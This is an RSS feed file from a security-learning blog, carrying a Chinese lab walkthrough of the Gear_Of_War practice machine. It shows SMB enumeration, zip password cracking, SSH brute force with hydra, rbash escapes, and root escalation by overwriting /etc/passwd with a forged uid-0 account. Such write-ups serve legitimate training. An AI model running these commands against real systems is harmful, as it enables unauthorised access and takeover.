@@ -1,0 +1,101 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Go Forward • Posts by &#34;gear_of_war靶场笔记&#34; tag</title>
+        <link>https://chungod.github.io</link>
+        <description>欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷</description>
+        <language>zh-CN</language>
+        <pubDate>Thu, 19 Aug 2021 21:00:00 +0800</pubDate>
+        <lastBuildDate>Thu, 19 Aug 2021 21:00:00 +0800</lastBuildDate>
+        <category>Coablt strike总结</category>
+        <category>Gear_Of_War靶场笔记</category>
+        <category>Linux反弹shell多种姿态</category>
+        <category>Linux提权笔记</category>
+        <category>Windows内核提权</category>
+        <category>impacket脚本利用</category>
+        <category>paramiko模块介绍</category>
+        <category>php危险函数</category>
+        <category>内存取证</category>
+        <category>meterpreter学习笔记</category>
+        <category>溯源取证总结</category>
+        <category>upload-labs通关记录</category>
+        <item>
+            <guid isPermalink="true">https://chungod.github.io/2021/08/19/Gear_Of_War%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</guid>
+            <title>Gear_Of_War靶场笔记</title>
+            <link>https://chungod.github.io/2021/08/19/Gear_Of_War%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/</link>
+            <category>Gear_Of_War靶场笔记</category>
+            <pubDate>Thu, 19 Aug 2021 21:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;gear_of_war靶场笔记&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gear_of_war靶场笔记&#34;&gt;#&lt;/a&gt; Gear_Of_War 靶场笔记&lt;/h2&gt;
+&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h3&gt;
+&lt;p&gt;先扫描靶机基本信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819151259588.png&#34; alt=&#34;image-20210819151259588&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现开放了 139 和 445 的 smb 端口，靶机系统为 Ubuntu&lt;/p&gt;
+&lt;p&gt;继续探测 smb 服务&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;enum4linux -S IP&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819151554260.png&#34; alt=&#34;image-20210819151554260&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞利用&#34;&gt;#&lt;/a&gt; 漏洞利用&lt;/h3&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;发现靶机开启了该共享 //172.16.101.250/LOCUS_LAN$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;利用smbclient --user=share 共享名  进行连接（无密码）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819151819536.png&#34; alt=&#34;image-20210819151819536&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现两个文件 msg_horda.zip 和 SOS.txt，GET 下载进行分析&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152044735.png&#34; alt=&#34;image-20210819152044735&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;字典生成&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#字典生成&#34;&gt;#&lt;/a&gt; 字典生成&lt;/h3&gt;
+&lt;p&gt;发现奇怪字符 [@%%,]，在密码学 crunch 中具有特殊意义&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@ 代表小写字母，% 代表数字，, 代表大写字符， ^ 代表特殊符号&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;所以利用 crunch 工具进行密码生成&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;crunch 4 4 -t @%%, -o wordlist&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152422139.png&#34; alt=&#34;image-20210819152422139&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152454714.png&#34; alt=&#34;image-20210819152454714&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;密码爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密码爆破&#34;&gt;#&lt;/a&gt; 密码爆破&lt;/h3&gt;
+&lt;p&gt;使用 fcrackzip 工具，配合第二题生成的字典文件进行密码爆破，获取到 msg_horda.zip 的密码&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;命令：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fcrackzip -D -p wordlist -u msg_horda.zip&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152649032.png&#34; alt=&#34;image-20210819152649032&#34;&gt;&lt;/p&gt;
+&lt;p&gt;成功破解得到 zip 密码 &lt;strong&gt;r44M&lt;/strong&gt;，利用密码解压 msg_horda.zip 得到&lt;strong&gt; key.txt&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819152845000.png&#34; alt=&#34;image-20210819152845000&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查看 key.txt，得到了一串字符 3_d4y，又发现靶机开启了 22 端口，&lt;/p&gt;
+&lt;p&gt;猜测可能是 ssh 服务的密码&lt;/p&gt;
+&lt;h3 id=&#34;用户爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户爆破&#34;&gt;#&lt;/a&gt; 用户爆破&lt;/h3&gt;
+&lt;p&gt;一、&lt;/p&gt;
+&lt;p&gt;浏览靶机 web 端 robots.txt，猜测用户名生成字典&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153202139.png&#34; alt=&#34;image-20210819153202139&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153431092.png&#34; alt=&#34;image-20210819153431092&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用自身生成的用户字典和密码 3_d4y 爆破 SSH 服务，得到 SSH 服务用户名 marcus&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hydra -L user.txt -p 3_d4y -t 64 ssh://172.16.101.250&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153615140.png&#34; alt=&#34;image-20210819153615140&#34;&gt;&lt;/p&gt;
+&lt;p&gt;二、&lt;/p&gt;
+&lt;p&gt;使用 /usr/share/wordlists/rockyou.txt 作为用户名字典，结合得到的密码尝试爆破 ssh 服务&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153715970.png&#34; alt=&#34;image-20210819153715970&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;先利用 zcat 进行解压gz文件，得到用户名字典&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zcat rockyou.txt.gz &amp;gt;rockyou.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819153805810.png&#34; alt=&#34;image-20210819153805810&#34;&gt;&lt;/p&gt;
+&lt;p&gt;利用九头蛇进行爆破，由于字典太大，需要慢慢等待&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hydra -L rockyou.txt -p 3_d4y -t 64 ssh://172.16.101.250&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;实在不行就利用翻转重新爆破，rev rockyou.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;ssh服务渗透&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh服务渗透&#34;&gt;#&lt;/a&gt; SSH 服务渗透&lt;/h3&gt;
+&lt;p&gt;利用知道的用户名和密码进行连接 ssh, 如若出现以下情况，可尝试重写输入 ssh marcus@172.16.101.250 进行连接即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819154553166.png&#34; alt=&#34;image-20210819154553166&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh marcus@172.16.101.250 (密码3_d4y) &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;成功登录 marcus 用户，但是为低权限&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819154716920.png&#34; alt=&#34;image-20210819154716920&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rbash逃逸和提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rbash逃逸和提权&#34;&gt;#&lt;/a&gt; rbash 逃逸和提权&lt;/h3&gt;
+&lt;p&gt;首先，查看可用提权，发现无法成功&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;find / -perm -u=s 2&amp;gt;/dev/null&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819154911595.png&#34; alt=&#34;image-20210819154911595&#34;&gt;&lt;/p&gt;
+&lt;p&gt;需要利用 rbash 逃逸&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;:set shell=/bin/sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;:shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819155406364.png&#34; alt=&#34;image-20210819155406364&#34;&gt;&lt;/p&gt;
+&lt;p&gt;也可以利用 python 进行逃逸，如下&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &lt;span class=&#34;string&#34;&gt;&amp;#x27;import pty;pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &lt;span class=&#34;string&#34;&gt;&amp;#x27;import os;os.system(&amp;quot;/bin/sh&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;或者 ssh 服务登录前也可以加入参数逃逸&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ssh marcus@172.16.101.250 -t &amp;quot;bash --noprofile&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;su提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#su提权&#34;&gt;#&lt;/a&gt; su 提权&lt;/h3&gt;
+&lt;p&gt;逃逸成功后，发现可以利用 su 提权&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;思路：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;当前的环境下可以执行cp和su、sudo权限，即可进行伪造、覆盖passwd文件进行su提权&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;所以，先生成一个伪造用户hack，指定root权限，生成passwd文件进行覆盖/etc/passwd文件，再利用su hack成功提权&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;命令：生成passwd文件的加密用户hack和密码hack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;openssl passwd -1 -salt hack hack&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819160109752.png&#34; alt=&#34;image-20210819160109752&#34;&gt;&lt;/p&gt;
+&lt;p&gt;创建 /root/passwd 文件，将 /etc/passwd 文件复制进去，添加 hack&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;vim passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;添加hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;覆盖/etc/passwd文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp -p passwd /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819160311685.png&#34; alt=&#34;image-20210819160311685&#34;&gt;&lt;/p&gt;
+&lt;p&gt;切换 hack 用户，成功&lt;strong&gt;提权&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210819160519286.png&#34; alt=&#34;image-20210819160519286&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
